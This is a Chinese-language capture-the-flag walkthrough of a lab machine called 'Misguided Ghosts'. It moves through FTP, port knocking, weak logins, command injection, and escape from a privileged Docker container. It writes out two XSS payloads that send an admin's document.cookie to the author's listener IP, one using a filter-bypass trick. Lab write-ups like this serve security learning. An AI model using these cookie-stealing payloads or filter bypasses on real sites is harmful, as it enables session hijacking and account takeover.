# Misguided Ghosts

---

## 端口扫描

循例nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/a75281215e3b4143843234cbfda29528.png)

## FTP枚举

直接登anonymous，有几个文件，下下来

![在这里插入图片描述](https://img-blog.csdnimg.cn/00cb99b7a32f4fa2bc81557ebe8a3925.png)

info.txt

	我已经包含了您要求的所有网络信息，以及一些我最喜欢的笑话。
	
	- 帕拉摩尔


该信息可能指的是pcapng文件

jokes.txt

	Taylor: Knock, knock.
	Josh:   Who's there?
	Taylor: The interrupting cow.
	Josh:   The interrupting cow--
	Taylor: Moo
	
	Josh:   Knock, knock.
	Taylor: Who's there?
	Josh:   Adore.
	Taylor: Adore who?
	Josh:   Adore is between you and I so please open up!


这里的暗示很明显，端口敲门无疑

## 端口敲门

打开pacapng文件分析，最终联合上文信息猜测应该有端口敲门的数据包

当向关闭的tcp端口发送 syn的时候，总是会回复RST ACK，所以可以基本确定这就是端口敲门的数据包

![在这里插入图片描述](https://img-blog.csdnimg.cn/0c0b88c516ad446d811e22dee5b890c8.png)

nc一把梭

![在这里插入图片描述](https://img-blog.csdnimg.cn/d99a87d4be454565a855ff7be4f2cdb5.png)

nmap再扫一遍，开了个8080，注意是https的

![在这里插入图片描述](https://img-blog.csdnimg.cn/9b7c09ca84c84820a5e8baa0b6b4fc80.png)

## Web枚举

进到8080的https

![在这里插入图片描述](https://img-blog.csdnimg.cn/1eada3740f2e4cd5b41fe63146a320ff.png)

gobuster扫一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/b6964caad9db495bac0facb47be1d9d5.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/d0074f4678114903a1272bec6204cc1b.png)

/console可以执行python代码，但需要先输入pin，但我们目前并没有

![在这里插入图片描述](https://img-blog.csdnimg.cn/f6df7d0cf753490eb1313f5a4ead8824.png)

到login看一下，正常的登录框，但我们目前没有任何凭据以及用户名，根据之前的经验，看一下https的证书

![在这里插入图片描述](https://img-blog.csdnimg.cn/c0bffc904f8d4a0f882d311f0bf0167d.png)

这里有个邮箱，zac应该就是用户名，拿去尝试弱口令

使用zac:zac凭据成功登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/009b7bf1e99e4ae6828068c6053aa82c.png)

这里有一条信息：

	Create a post below; admins will check every two minutes so don't be rude.

这意味着我们可以尝试xss来捕获admin的cookie

	<script>fetch('http://10.14.39.48:8000/?cookie=' + btoa(document.cookie));</script>

发现有过滤

![在这里插入图片描述](https://img-blog.csdnimg.cn/8233a0f8e92849f88e00a16cb1bbe3a8.png)

fetch和iframe的请求似乎都会被拦截，这里通过img可以通过

	&lt;scscriptript&gt;var a = new Image();a.src = 'http://10.14.39.48:8000/?cookie='+btoa(document.cookie);&lt;/scscriptript&gt;

![在这里插入图片描述](https://img-blog.csdnimg.cn/e814a0c8c2e84290989882d3bea7093a.png)

稍等一会，admin就会到来

![在这里插入图片描述](https://img-blog.csdnimg.cn/df548c9eaf344892a703dadf9bcbccf5.png)

base64解码后把cookie丢到cookie editor

![在这里插入图片描述](https://img-blog.csdnimg.cn/55d79096ce4e4eb8b204fd5192b9c14a.png)

似乎也没啥东西，带着cookie再扫一遍目录

![在这里插入图片描述](https://img-blog.csdnimg.cn/c9d6b365d7ca467a9360fd17a8d42dde.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/5c894696c5b8455e9fe0771c5dc00718.png)

/photos，一个文件上传

![在这里插入图片描述](https://img-blog.csdnimg.cn/1268019460e9432ca1bd75a732a38915.png)

尝试上传的时候发现图片都传不上去，回显是显示文件不存在

![在这里插入图片描述](https://img-blog.csdnimg.cn/2164368b3e1a42e6ab03ffc91f1fcf00.png)

根据之前的经验，可能是执行的类似ls的命令，尝试绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/b941270a82184202a24bdb65ea7c31e9.png)

能够rce，尝试reverse shell

甚至还有空格过滤

![在这里插入图片描述](https://img-blog.csdnimg.cn/e565ea12d1064eafa12687271ee81831.png)

通过${IFS}轻松绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/2e5dfdb0cbe64f9d883555fc8cd92fbc.png)

## Docker逃逸

进来就看见.dockerenv

![在这里插入图片描述](https://img-blog.csdnimg.cn/72f35c48c0b445f5a2227bc66e5f9d78.png)

可以看到使用了--privileged以特权身份运行

根据HackTricks的Trick，我们能够访问到所有设备，我们可以直接把宿主机的disk直接挂载过来

![在这里插入图片描述](https://img-blog.csdnimg.cn/38c4eed8307e4d07b57876e835115706.png)

fdisk查看, 有个19GB的，是它没错了

![在这里插入图片描述](https://img-blog.csdnimg.cn/e0a30fef764549dcb076f185e1aee800.png)

mount挂载过来

![在这里插入图片描述](https://img-blog.csdnimg.cn/09d1e94a944b439b8c5c24db3077db9c.png)

成功拿到user和root flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/3299ba4ba22d43b0bdcb5c527bd76ee5.png)
